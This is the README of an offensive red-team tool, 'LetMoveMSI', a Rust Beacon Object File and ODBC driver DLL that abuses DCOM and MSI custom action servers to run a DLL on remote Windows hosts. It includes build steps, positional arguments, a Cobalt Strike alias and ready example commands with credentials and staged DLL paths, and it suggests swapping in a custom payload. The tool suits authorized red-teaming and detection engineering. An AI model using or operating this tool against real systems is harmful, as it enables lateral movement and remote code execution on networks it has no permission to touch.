# LetMoveMSI

Lateral Movement

## Requirements

- Rust nightly (pinned via `rust-toolchain.toml`)
- [boflink](https://github.com/MEhrn00/boflink) on `PATH`
- [cargo-make](https://github.com/sagiegurari/cargo-make)
- For the driver DLL: `rustup target add x86_64-pc-windows-gnu` and a working MinGW linker

## Build

```
# BoF: produces letmove_msi.x64.o and letmove_msi.x86.o under bof/out/
cd bof && cargo make

# Driver: cross-compile from Linux/macOS
cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
```

Artifacts:

- `bof/out/letmove_msi.x64.o`, `bof/out/letmove_msi.x86.o`
- `target/x86_64-pc-windows-gnu/release/odbcpivot.dll`

## BoF usage

Arguments are seven wide (UTF-16LE) strings in fixed positional order. Pass an empty string for absent fields.

```
letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
```

- `mode`: `local` or `remote`.
- `host`: target machine name. Required for `remote`, empty for `local`.
- `domain` / `user` / `pass`: alternate credentials. Leave all three empty to run as the caller.
- `driver`: ODBC driver name to register (arbitrary).
- `dll`: absolute path to the driver DLL on the **target**, not the operator's machine. Stage `odbcpivot.dll` (or any DLL exporting `ConfigDriver`) there first.

### Aggressor script

Load `letmove_msi.cna` in Cobalt Strike (`Script Manager > Load...`) to get a `letmove_msi` alias with argument validation, architecture auto-selection, and inline help via `help letmove_msi`.

```
letmove_msi remote DC01 CORP svc-admin P4ss! LMPivot C:\Windows\Temp\odbcpivot.dll
letmove_msi local "" "" "" "" LMPivot C:\Windows\Temp\odbcpivot.dll
```

The script looks up the BoF object in `dist/` first, then falls back to `bof/out/` for source builds.

## Driver behaviour

`ConfigDriver` collects the invoking process's token context (SID, elevation, logon session id, PID, integrity level) and appends one line per field to a log file. The default path is `%PROGRAMDATA%\odbcpivot.dat`. Override at compile time with the `ODBCPIVOT_LOG` environment variable:

```
ODBCPIVOT_LOG='C:\\Temp\\out.dat' cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
```

Swap the DLL for your own if you need a different payload.

## Layout

```
bof/
  src/argv.rs      wire-protocol argument parsing
  src/vtbl.rs      IUnknown, IMsiServer, IMsiCustomAction vtables + GUIDs
  src/secure.rs    COAUTHIDENTITY / COAUTHINFO builder + proxy blanket
  src/stage.rs     MsiServer authentication + CustomActionServer bring-up
  src/deploy.rs    SQLInstallDriverEx + SQLConfigDriver invocation
  Makefile.toml    boflink recipe
driver/
  src/lib.rs       DllMain + ConfigDriver
Cargo.toml         workspace root
rust-toolchain.toml
```

## Credits

- SpecterOps write-up: [DCOM Again](https://specterops.io/blog/2025/09/29/dcom-again-installing-trouble-lateral-movement-bof/)
- Custom Action Server bounce: Eliran Nasser (Deep Instinct), [Forget PsExec: DCOM Upload & Execute Backdoor](https://www.deepinstinct.com/blog/forget-psexec-dcom-upload-execute-backdoor)
- BoF template: [joaoviictorti/rustbof](https://github.com/joaoviictorti/rustbof)

## License

MIT. See `LICENSE`.

## Disclaimer

For authorized security testing, red-team engagements, and detection-engineering research. You are responsible for having permission to run this against every target you touch.
